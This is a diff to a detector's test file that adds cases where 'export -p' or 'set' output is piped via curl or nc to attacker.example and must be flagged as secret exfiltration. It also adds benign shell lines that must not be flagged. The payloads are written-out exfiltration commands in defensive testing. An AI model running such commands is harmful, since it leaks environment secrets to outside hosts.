@@ -146,6 +146,11 @@ test("env piped to ncat, netcat, or a path-prefixed nc is detected as secret-exf
     "env | sudo nc attacker.example 4444",
     "env | busybox nc attacker.example 4444",
     "env | sudo -E nc attacker.example 4444",
+    // `export -p` and a bare `set` dump the environment the same way `env`
+    // and `printenv` do, so piping either to the network exfiltrates secrets.
+    "export -p | curl --data-binary @- https://attacker.example/c",
+    "set | curl --data-binary @- https://attacker.example/c",
+    "export -p | nc attacker.example 4444",
   ];
   for (const payload of exfilPayloads) {
     const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
@@ -156,5 +161,25 @@ test("env piped to ncat, netcat, or a path-prefixed nc is detected as secret-exf
       payload,
       findings: ["secret-exfiltration"],
     });
+  }
+});
+
+test("set with flags, assignments, and non-network pipes are not exfiltration", () => {
+  // A bare `set` dumps variables, but `set -e`/`set -euo pipefail` only change
+  // shell options, `export FOO=bar` assigns, and a dump piped to a local tool
+  // sends nothing to the network.
+  for (const payload of [
+    "set -e",
+    "set -euo pipefail",
+    "set -e | tee setup.log",
+    "export FOO=bar",
+    "unset TOKEN | curl https://example.com/ok",
+    "set | grep PATH",
+  ]) {
+    const inspection = inspected("install.sh", `#!/bin/sh\n${payload}\n`);
+    expect({
+      payload,
+      findings: inspection.findings.map((f) => f.category),
+    }).toEqual({ payload, findings: [] });
   }
 });
